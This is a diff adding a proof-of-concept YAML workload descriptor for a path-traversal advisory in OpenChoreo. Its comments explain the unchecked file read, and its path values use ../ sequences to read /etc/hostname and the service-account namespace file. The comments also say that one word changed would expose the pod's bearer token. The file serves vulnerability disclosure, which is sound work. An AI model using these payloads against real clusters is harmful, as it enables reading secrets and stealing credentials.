@@ -1,0 +1,28 @@
+# OpenChoreo Workload Descriptor — GHSA-qmr9-v9v3-j32g PoC (path traversal)
+#
+# Non-destructive demonstration of the workload-descriptor path-traversal bug:
+# `configurations.files[].valueFrom.path` is passed to filepath.Join(baseDir, path)
+# then a bare os.ReadFile with no containment (converter.go addConfigurationsFromDescriptor),
+# so `../` escapes the descriptor directory and reads arbitrary files the build pod can see.
+#
+# Targets below are deliberately NON-SECRET so nothing sensitive lands in the build
+# log / Workload CR / WorkflowRun annotation:
+#   1. /etc/hostname                                  -> arbitrary out-of-tree read
+#   2. .../serviceaccount/namespace                   -> reached the SA secret dir itself
+# Swapping (2)'s `namespace` for `token` would yield the pod's bearer token — that is
+# the real impact, intentionally NOT done here.
+apiVersion: openchoreo.dev/v1alpha1
+
+metadata:
+  name: document-service
+
+configurations:
+  files:
+    - name: poc-hostname
+      mountPath: /tmp/poc-hostname
+      valueFrom:
+        path: ../../../../../../../../etc/hostname
+    - name: poc-sa-namespace
+      mountPath: /tmp/poc-sa-namespace
+      valueFrom:
+        path: ../../../../var/run/secrets/kubernetes.io/serviceaccount/namespace
